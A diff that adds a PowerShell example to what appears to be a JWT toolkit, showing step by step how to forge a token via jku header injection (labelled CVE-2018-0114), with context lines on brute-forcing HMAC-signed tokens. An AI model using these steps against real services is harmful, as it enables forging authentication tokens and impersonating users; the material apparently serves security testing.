@@ -97,6 +97,24 @@ $signature = New-JwtSignature -JsonWebToken $jwtSansSig -HashAlgorithm SHA256 -C
 $signedJwt = "{0}.{1}" -f $jwtSansSig, $signature
 
 
+# CVE-2018-0114 vulnerability
+# 1. Acquire JWT:
+$jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyIsImtpZCI6IjJ5Q3Zabms3azhXNjZ3UjJMWFI5V0Nzd2hBYyJ9.eyJpYXQiOjE2MDYwNTk2MjMsIm5iZiI6MTYwNjA1OTYyMywiZXhwIjoxNjA2MDU5OTIzLCJzdWIiOiJ1c2VybmFtZUBjb21wYW55LmNvbSJ9.R6nTqCRwj_FchHp4oblZTkEIhSiSpGCV255SdXmWibNKS4eXtPlCngYaqfIqCwbeCbQB9G2zKHm2gAAolmylaZVoxaGTLOrrJXhfX79b4MNCT2Ixa1h2-B0RbBwV0lBCuaZscays-mxbR0INdnCPnuefrh1VyU9MC6dBpi-Q8r_En6Rtk1wl_a-xX93WtC2no96AtEV5kNErRUHOmTfhe2IjZR6S5uaMgXxrp7Ays8kEYVGwdWhF-JJ_9yUw9PB5pCmgkBED6urNNoeSTeEjTiqsRoHa1Ra9DhOriaegWXOZHEdthpg_JIzDBPYWjBbIfhNvhCwBrhGHbeXUtJL4bg"
+
+# 2. Get cert used to sign token via RSA-SHA256:
+$cert = Get-PfxCertificate -FilePath "~/certs/cert.pfx"
+
+# 3. Deserialize existing payload:
+[System.Collections.Hashtable]$payload = Get-JsonWebTokenPayload -JsonWebToken $jwt
+
+# 4. Generate JWK set to be placed on http://myserver/jwkcollection/jwks.json:
+$cert | New-JsonWebKeySet -Compress | Out-File -FilePath "C:\temp\jwks.json" -Encoding ascii
+
+# 5. Create token with jku claim in header signed by certificate with private key defined in step 2:
+$jwkUri = "http://myserver/jwkcollection/jwks.json"
+$newJwt = New-JsonWebToken -Claims $payload -HashAlgorithm SHA256 -SigningCertificate $cert -JwkUri $jwkUri -TimeToLive 300
+
+
 # Brute force an HMAC-SHA256 JWT
 $jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MDYxNDEwOTMsIm5iZiI6MTYwNjE0MTA5MywiZXhwIjoxNjA2MTQxMzkzLCJqdGkiOiI1Njk5YTBlYTk3YzM0Yzc2OTlkZGZlNzNmNTIzOTI1MiIsInN1YiI6InVzZXJuYW1lQGNvbXBhbnkuY29tIn0.Ej86QALzH37R1zB7QhwwYdFjXL1UhG2E3n6nezEYONY"
 
